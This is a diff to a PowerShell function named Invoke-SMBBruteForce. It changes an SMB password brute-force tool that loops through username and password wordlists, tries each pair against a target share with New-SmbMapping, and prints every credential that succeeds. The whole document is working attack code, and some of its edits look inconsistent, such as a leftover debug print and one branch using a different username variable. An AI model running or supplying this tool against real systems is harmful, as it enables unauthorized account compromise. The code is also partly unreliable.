@@ -72,21 +72,28 @@ function Invoke-SMBBruteForce
 
     Process
     {
-
+        $Counter = 0
         Write-Host "[*]Trying to authenticate against \\$target"
 
         $SetName = $PsCmdlet.ParameterSetName
-        if($SetName -eq "Files")
-        {
+        write-host $SetName
+
             if(!$Username)
             {
+                $UserFileLength = (Get-Content $UsernameFile).Length
+                Write-Host "[*]Loaded $UserFileLength from $UsernameFile"
                 foreach($user in get-content $UsernameFile)
                 {
+                $u = "$target\$user"
                     if(!$PasswordFile)
                     {
                         try 
                         {
-                             new-smbmapping -remotepath \\$target -username $user -password $Password -EA SilentlyContinue
+                             $valid = new-smbmapping -remotepath \\$target -username $u -password $Password
+                             if($valid)
+                             {
+                                Write-Host "[*]Success! Password for $u is $Password"
+                                }
                         }
                         catch 
                         {
@@ -97,11 +104,16 @@ function Invoke-SMBBruteForce
                     }
                     else
                     {
+                        
                         foreach($pw in get-content $PasswordFile)
                         {
                             try
                             {
-                                new-smbmapping -remotepath \\$target -username $user -password $pw -EA SiltentlyContinue
+                                $valid = new-smbmapping -remotepath \\$target -username $u -password $pw 
+                                if($valid)
+                                {
+                                write-host "[*]Success! Password for $u is $pw"
+                                }
                             }
                             catch
                             {
@@ -115,12 +127,17 @@ function Invoke-SMBBruteForce
             }
             else
             {
-                $user = $username
+                $u = "$Target\$Username"
+                Write-Host "[*]Attempting to brute force $target with the username $u "
                 if(!$PasswordFile)
                 {
                     try 
                     {
-                         new-smbmapping -remotepath \\$target -username $user -password $Password -EA SilentlyContinue
+                         $valid = new-smbmapping -remotepath \\$target -username $u -password $Password 
+                         if($valid)
+                         {
+                            write-host "[*]Success! Password for $u is $Password"
+                            }
                     }
                     catch 
                     {
@@ -135,7 +152,11 @@ function Invoke-SMBBruteForce
                     {
                         try
                         {
-                            new-smbmapping -remotepath \\$target -username $user -password $pw -EA SiltentlyContinue
+                            $valid = new-smbmapping -remotepath \\$target -username $user -password $pw -EA SilentlyContinue
+                            if($valid)
+                            {
+                                Write-Host "[*]Success! Password for $u is $pw"
+                                }
                         }
                         catch
                         {
@@ -147,6 +168,7 @@ function Invoke-SMBBruteForce
             
             }
         }
-    }
+    
 
 }
+ 
